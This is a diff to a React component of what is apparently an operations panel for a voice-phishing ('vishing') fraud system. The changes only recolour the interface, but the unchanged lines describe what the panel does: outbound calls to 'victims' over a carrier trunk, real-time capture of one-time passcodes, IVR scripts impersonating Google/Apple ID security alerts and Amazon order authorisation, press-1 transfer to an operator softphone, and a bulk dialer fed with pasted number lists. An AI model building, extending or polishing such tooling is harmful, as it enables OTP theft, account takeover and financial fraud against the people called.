@@ -512,7 +512,7 @@ export const ProductionOperationsTab: React.FC<ProductionOperationsTabProps> = (
               Dispara llamadas salientes directas hacia víctimas y clientes a través de la troncal{' '}
               <strong className="text-white font-mono">{activeCarrier}</strong>. Captura dígitos OTP en tiempo
               real o transfiere la llamada a tu softphone X-Lite (extensión{' '}
-              <strong className="text-amber-400 font-mono">{agentExtension}</strong>).
+              <strong className="text-emerald-400 font-mono">{agentExtension}</strong>).
             </p>
           </div>
 
@@ -532,7 +532,7 @@ export const ProductionOperationsTab: React.FC<ProductionOperationsTabProps> = (
 
             <div className="px-3 py-1.5 rounded-lg bg-slate-950 border border-slate-800 text-xs">
               <div className="text-[10px] text-slate-500 uppercase font-mono">Asesor Asignado</div>
-              <div className="font-bold text-amber-400 font-mono">Ext. {agentExtension}</div>
+              <div className="font-bold text-emerald-400 font-mono">Ext. {agentExtension}</div>
             </div>
           </div>
         </div>
@@ -569,15 +569,15 @@ export const ProductionOperationsTab: React.FC<ProductionOperationsTabProps> = (
 
       {/* ACTIVE CALL REAL-TIME HUD (Appears when a call is running) */}
       {activeCall && activeCall.isActive && (
-        <div className="p-6 rounded-2xl bg-slate-950 border-2 border-amber-500/50 shadow-2xl relative overflow-hidden animate-fadeIn">
+        <div className="p-6 rounded-2xl bg-slate-950 border-2 border-emerald-500/50 shadow-2xl relative overflow-hidden animate-fadeIn">
           <div className="flex flex-col md:flex-row md:items-center justify-between gap-4 border-b border-slate-800 pb-4">
             <div className="flex items-center gap-3">
-              <div className="p-3 rounded-xl bg-amber-500/20 text-amber-400 animate-pulse">
+              <div className="p-3 rounded-xl bg-emerald-500/20 text-emerald-400 animate-pulse">
                 <Radio className="w-6 h-6" />
               </div>
               <div>
                 <div className="flex items-center gap-2">
-                  <span className="text-xs font-bold px-2 py-0.5 rounded-full bg-amber-500/20 text-amber-300 border border-amber-500/30">
+                  <span className="text-xs font-bold px-2 py-0.5 rounded-full bg-emerald-500/20 text-emerald-300 border border-emerald-500/30">
                     LLAMADA EN PROCESO
                   </span>
                   <span className="text-xs text-slate-400 font-mono">{formatTime(activeCall.duration)}</span>
@@ -586,7 +586,7 @@ export const ProductionOperationsTab: React.FC<ProductionOperationsTabProps> = (
                   {activeCall.number} {activeCall.name && `(${activeCall.name})`}
                 </h3>
                 <p className="text-xs text-slate-400">
-                  Servicio activo: <strong className="text-amber-300">{activeCall.service}</strong>
+                  Servicio activo: <strong className="text-emerald-300">{activeCall.service}</strong>
                 </p>
               </div>
             </div>
@@ -596,7 +596,7 @@ export const ProductionOperationsTab: React.FC<ProductionOperationsTabProps> = (
               <button
                 id="btn-hud-transfer-agent"
                 onClick={handleTransferToAgent}
-                className="inline-flex items-center gap-1.5 px-3 py-2 rounded-lg text-xs font-bold bg-amber-500 hover:bg-amber-400 text-slate-950 transition-all"
+                className="inline-flex items-center gap-1.5 px-3 py-2 rounded-lg text-xs font-bold bg-emerald-500 hover:bg-emerald-400 text-black transition-all shadow-md shadow-emerald-500/20"
               >
                 <PhoneForwarded className="w-3.5 h-3.5" />
                 <span>Pasar a Asesor (1001)</span>
@@ -618,7 +618,7 @@ export const ProductionOperationsTab: React.FC<ProductionOperationsTabProps> = (
             <div
               className={`p-3 rounded-xl border ${
                 activeCall.status === 'dialing'
-                  ? 'bg-amber-500/20 border-amber-500 text-amber-300 font-bold animate-pulse'
+                  ? 'bg-emerald-500/20 border-emerald-500 text-emerald-300 font-bold animate-pulse'
                   : 'bg-slate-900 border-slate-800 text-slate-400'
               }`}
             >
@@ -629,7 +629,7 @@ export const ProductionOperationsTab: React.FC<ProductionOperationsTabProps> = (
             <div
               className={`p-3 rounded-xl border ${
                 activeCall.status === 'ringing'
-                  ? 'bg-amber-500/20 border-amber-500 text-amber-300 font-bold animate-pulse'
+                  ? 'bg-emerald-500/20 border-emerald-500 text-emerald-300 font-bold animate-pulse'
                   : 'bg-slate-900 border-slate-800 text-slate-400'
               }`}
             >
@@ -640,7 +640,7 @@ export const ProductionOperationsTab: React.FC<ProductionOperationsTabProps> = (
             <div
               className={`p-3 rounded-xl border ${
                 activeCall.status === 'in_ivr'
-                  ? 'bg-amber-500/20 border-amber-500 text-amber-300 font-bold animate-pulse'
+                  ? 'bg-emerald-500/20 border-emerald-500 text-emerald-300 font-bold animate-pulse'
                   : 'bg-slate-900 border-slate-800 text-slate-400'
               }`}
             >
@@ -693,7 +693,7 @@ export const ProductionOperationsTab: React.FC<ProductionOperationsTabProps> = (
               </div>
             ) : (
               <div className="py-4 text-slate-500 text-sm flex items-center justify-center gap-2 font-mono">
-                <RefreshCw className="w-4 h-4 animate-spin text-amber-400" />
+                <RefreshCw className="w-4 h-4 animate-spin text-emerald-400" />
                 <span>Esperando que el objetivo digite el código en su móvil...</span>
               </div>
             )}
@@ -795,7 +795,7 @@ export const ProductionOperationsTab: React.FC<ProductionOperationsTabProps> = (
                         : 'bg-slate-900 border-slate-800 text-slate-400 hover:text-white'
                     }`}
                   >
-                    <Lock className="w-4 h-4 text-amber-400 mb-1" />
+                    <Lock className="w-4 h-4 text-emerald-400 mb-1" />
                     <div className="text-xs font-bold">Google / Apple ID</div>
                     <div className="text-[10px] text-slate-500">Alerta de seguridad</div>
                   </button>
@@ -809,7 +809,7 @@ export const ProductionOperationsTab: React.FC<ProductionOperationsTabProps> = (
                         : 'bg-slate-900 border-slate-800 text-slate-400 hover:text-white'
                     }`}
                   >
-                    <ShoppingBag className="w-4 h-4 text-amber-300 mb-1" />
+                    <ShoppingBag className="w-4 h-4 text-emerald-400 mb-1" />
                     <div className="text-xs font-bold">Amazon / Envíos</div>
                     <div className="text-[10px] text-slate-500">Autorización pedido</div>
                   </button>
@@ -861,7 +861,7 @@ export const ProductionOperationsTab: React.FC<ProductionOperationsTabProps> = (
                         : 'bg-slate-900 border-slate-800 text-slate-400 hover:text-white'
                     }`}
                   >
-                    <PhoneForwarded className="w-4 h-4 text-amber-400 mb-1" />
+                    <PhoneForwarded className="w-4 h-4 text-emerald-400 mb-1" />
                     <div className="text-xs font-bold">2. Press-1 (A X-Lite)</div>
                     <div className="text-[11px] text-slate-400 mt-0.5">
                       Si presiona 1, timbra directo en tu extensión 1001.
@@ -892,13 +892,13 @@ export const ProductionOperationsTab: React.FC<ProductionOperationsTabProps> = (
               <div className="p-4 rounded-xl bg-slate-900/90 border border-slate-800 space-y-4">
                 <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-2 border-b border-slate-800 pb-2.5">
                   <div className="flex items-center gap-2">
-                    <Volume2 className="w-4 h-4 text-amber-400" />
+                    <Volume2 className="w-4 h-4 text-emerald-400" />
                     <div>
                       <h4 className="text-xs font-bold text-white uppercase tracking-wider">
                         Locuciones Pregrabadas del IVR
                       </h4>
                       <p className="text-[11px] text-slate-400">
-                        Campaña activa: <strong className="text-amber-300">{serviceLabel}</strong>
+                        Campaña activa: <strong className="text-emerald-300">{serviceLabel}</strong>
                       </p>
                     </div>
                   </div>
@@ -909,7 +909,7 @@ export const ProductionOperationsTab: React.FC<ProductionOperationsTabProps> = (
                       setQuickUploadSlot('introAudioPath');
                       setIsQuickUploadOpen(true);
                     }}
-                    className="inline-flex items-center gap-1.5 px-3 py-1.5 rounded-lg text-xs font-semibold bg-amber-500/10 border border-amber-500/30 text-amber-300 hover:bg-amber-500/20 transition-all self-start sm:self-auto"
+                    className="inline-flex items-center gap-1.5 px-3 py-1.5 rounded-lg text-xs font-semibold bg-emerald-500/10 border border-emerald-500/30 text-emerald-300 hover:bg-emerald-500/20 transition-all self-start sm:self-auto"
                   >
                     <Plus className="w-3.5 h-3.5" />
                     <span>+ Subir / Grabar Audio</span>
@@ -921,7 +921,7 @@ export const ProductionOperationsTab: React.FC<ProductionOperationsTabProps> = (
                   <div className="p-3 rounded-lg bg-slate-950 border border-slate-800 space-y-2">
                     <div className="flex items-center justify-between">
                       <label className="text-[11px] font-bold text-slate-300 flex items-center gap-1.5">
-                        <span className="w-1.5 h-1.5 rounded-full bg-amber-400"></span>
+                        <span className="w-1.5 h-1.5 rounded-full bg-emerald-400"></span>
                         <span>1. Saludo / Alerta Inicial</span>
                       </label>
                       <button
@@ -932,7 +932,7 @@ export const ProductionOperationsTab: React.FC<ProductionOperationsTabProps> = (
                         title="Escuchar audio"
                       >
                         {playingAudioKey === 'intro' ? (
-                          <Pause className="w-3.5 h-3.5 text-amber-400 animate-pulse" />
+                          <Pause className="w-3.5 h-3.5 text-emerald-400 animate-pulse" />
                         ) : (
                           <Play className="w-3.5 h-3.5 text-slate-300" />
                         )}
@@ -941,7 +941,7 @@ export const ProductionOperationsTab: React.FC<ProductionOperationsTabProps> = (
                     <select
                       value={campaignAudios[selectedService].introAudioPath}
                       onChange={(e) => handleUpdateCampaignAudio(selectedService, 'introAudioPath', e.target.value)}
-                      className="w-full px-2.5 py-1.5 bg-slate-900 border border-slate-700 rounded-lg text-xs text-white focus:outline-none focus:border-amber-500 font-mono"
+                      className="w-full px-2.5 py-1.5 bg-slate-900 border border-slate-700 rounded-lg text-xs text-white focus:outline-none focus:border-emerald-500 font-mono"
                     >
                       <option value="">-- Beep estándar de Asterisk --</option>
                       <option value={`custom/alerta_${selectedService}`}>custom/alerta_{selectedService} (Recomendado)</option>
@@ -1135,7 +1135,7 @@ export const ProductionOperationsTab: React.FC<ProductionOperationsTabProps> = (
 
                 <div className="p-3 rounded-xl bg-slate-900 border border-slate-800">
                   <div className="text-[10px] text-slate-500 font-mono">Softphone del Operador</div>
-                  <div className="font-bold text-amber-400 mt-0.5 font-mono">X-Lite / Extensión 1001</div>
+                  <div className="font-bold text-emerald-400 mt-0.5 font-mono">X-Lite / Extensión 1001</div>
                   <div className="text-[11px] text-slate-400">Recibe transferencias cuando la víctima presiona 1</div>
                 </div>
               </div>
@@ -1149,7 +1149,7 @@ export const ProductionOperationsTab: React.FC<ProductionOperationsTabProps> = (
         <div className="p-6 rounded-2xl bg-slate-950 border border-slate-800 space-y-4">
           <div className="flex items-center justify-between">
             <h3 className="text-base font-bold text-white flex items-center gap-2">
-              <Flame className="w-5 h-5 text-amber-400" />
+              <Flame className="w-5 h-5 text-emerald-400" />
               <span>Marcador Masivo por Lotes (Bulk Campaign)</span>
             </h3>
             <span className="text-xs text-slate-400">Pega tu lista de números telefónicos</span>
@@ -1182,7 +1182,7 @@ export const ProductionOperationsTab: React.FC<ProductionOperationsTabProps> = (
                   alert(`Cargado primer número de la lista: ${nums[0].trim()}`);
                 }
               }}
-              className="px-5 py-2.5 rounded-xl text-xs font-bold bg-amber-500 hover:bg-amber-400 text-slate-950 transition-all"
+              className="px-5 py-2.5 rounded-xl text-xs font-bold bg-emerald-500 hover:bg-emerald-400 text-black transition-all shadow-md shadow-emerald-500/20"
             >
               Cargar al Disparador de Producción
             </button>
@@ -1309,7 +1309,7 @@ export const ProductionOperationsTab: React.FC<ProductionOperationsTabProps> = (
           <div className="bg-slate-900 border border-slate-700 rounded-2xl max-w-md w-full p-6 shadow-2xl space-y-5">
             <div className="flex items-center justify-between border-b border-slate-800 pb-3">
               <div className="flex items-center gap-2">
-                <FileAudio className="w-5 h-5 text-amber-400" />
+                <FileAudio className="w-5 h-5 text-emerald-400" />
                 <h3 className="font-bold text-white text-sm">
                   Cargar Nueva Locución para la Campaña
                 </h3>
@@ -1364,7 +1364,7 @@ export const ProductionOperationsTab: React.FC<ProductionOperationsTabProps> = (
                 {/* Subir archivo */}
                 <div className="p-3 rounded-xl bg-slate-950 border border-slate-800 space-y-2">
                   <div className="text-[11px] text-slate-400 flex items-center gap-1.5">
-                    <UploadCloud className="w-3.5 h-3.5 text-amber-400" />
+                    <UploadCloud className="w-3.5 h-3.5 text-emerald-400" />
                     <span>Seleccionar archivo (.wav, .mp3, .ogg)</span>
                   </div>
                   <input
@@ -1384,7 +1384,7 @@ export const ProductionOperationsTab: React.FC<ProductionOperationsTabProps> = (
                         reader.readAsDataURL(file);
                       }
                     }}
-                    className="block w-full text-xs text-slate-400 file:mr-3 file:py-1.5 file:px-3 file:rounded-lg file:border-0 file:text-xs file:font-semibold file:bg-slate-800 file:text-amber-300 hover:file:bg-slate-700 cursor-pointer"
+                    className="block w-full text-xs text-slate-400 file:mr-3 file:py-1.5 file:px-3 file:rounded-lg file:border-0 file:text-xs file:font-semibold file:bg-slate-800 file:text-emerald-300 hover:file:bg-slate-700 cursor-pointer"
                   />
                 </div>
 
@@ -1462,7 +1462,7 @@ export const ProductionOperationsTab: React.FC<ProductionOperationsTabProps> = (
                 type="button"
                 onClick={handleSaveQuickAudio}
                 disabled={!quickUploadDataUrl || !quickUploadName.trim()}
-                className="px-4 py-2 rounded-xl text-xs font-bold bg-amber-500 hover:bg-amber-400 text-slate-950 shadow-lg shadow-amber-500/20 disabled:opacity-40 transition-all flex items-center gap-1.5"
+                className="px-4 py-2 rounded-xl text-xs font-bold bg-emerald-500 hover:bg-emerald-400 text-black shadow-lg shadow-emerald-500/20 disabled:opacity-40 transition-all flex items-center gap-1.5"
               >
                 <Check className="w-4 h-4" />
                 <span>Asignar a la Campaña</span>
